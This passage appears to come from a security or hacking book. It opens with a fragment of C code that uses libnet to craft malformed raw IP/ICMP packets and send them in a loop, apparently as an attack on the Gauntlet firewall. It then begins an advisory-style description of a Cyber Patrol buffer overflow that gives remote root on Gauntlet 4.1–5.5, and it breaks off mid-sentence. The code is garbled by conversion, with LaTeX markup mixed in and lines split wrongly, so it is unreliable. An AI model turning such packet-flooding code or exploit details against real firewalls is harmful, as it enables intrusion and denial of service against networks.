```
ip-
>ip_hl
>ip_tos
ip-
= 0xf;
/ * Some IP Options
*/
= 0xa3;
/ * Whatever
*/
ip-
>ip_len
= htons(data_len);
/ * Length of packet
*/
ip-
>ip_id
= 30241;
/ * Whatever
*/
ip-
>ip_off
= 0;
/ * No frag's
*/
ip-
>ip_ttl
= 32;
/ * Whatever
*/
ip-
>ip_p
= 98;
/ * Random protocpl
*/
ip-
>ip_sum
= 0;
/ * Will calc later
*/
$$
\begin{array}{l}
\text{ip->ip_src.s_addr = ins_src_ip;} \\
\text{ip->ip_dst.s_addr = ins_dst_ip;} \\
\text{/ * Move our data block into the packet */} \\
\text{bcopy (data, (void *) (packet + IP_H + IP_H + 8), data_len);} \\
\text{/ * I hate checksuming. Spent a day trying to get it to wor} \\
\text{k in} \\
\begin{array}{l}
* \text{perl...} \quad \text{That sucked...} \\
\text{Tequilla would have helped immensely.} \\
* / \quad \text{libnet_do_checksum ((unsigned char *) ip, IPPROTO_IP, data_l} \\
\text{en);} \\
\text{/ * Bah... See above comment. * /} \\
\text{libnet_do_checksum (packet, IPPROTO_ICMP, len);} \\
\text{printf ("Sending %li packets", count);} \\
\text{for (acx = 0; acx < count; acx++) {}} \\
\text{if (libnet_write_ip(sock, packet, len + IP_H) < (len + I} \\
\text{P_H))} \\
\text{perror("write_ip: ");} \\
\text{else printf(".");} \\
\text{printf("\n\n");} \\
\text{return (0);} \\
\text{}}
\end{array}
\end{array}
```

# Subjective Code Execution via Buffer Overflow

**Synopsis:** This Gauntlet breach enables a remote attacker to cause the firewall to execute arbitrary code.

**Hack State: Unauthorized code execution.**

**Vulnerabilities:** Versions 4.1, 4.2, 5.0, and 5.5, depending on the configuration.

**Breach:** A buffer overflow exists in the version of Mattel's Cyber Patrol software integrated to Network Associates' Gauntlet firewall, versions 4.1, 4.2, 5.0, and 5.5. Due to the manner in which Cyber Patrol was integrated, a vulnerability was introduced that could allow a remote attacker to gain root access on the firewall or to execute arbitrary commands on the firewall. By default, Cyber Patrol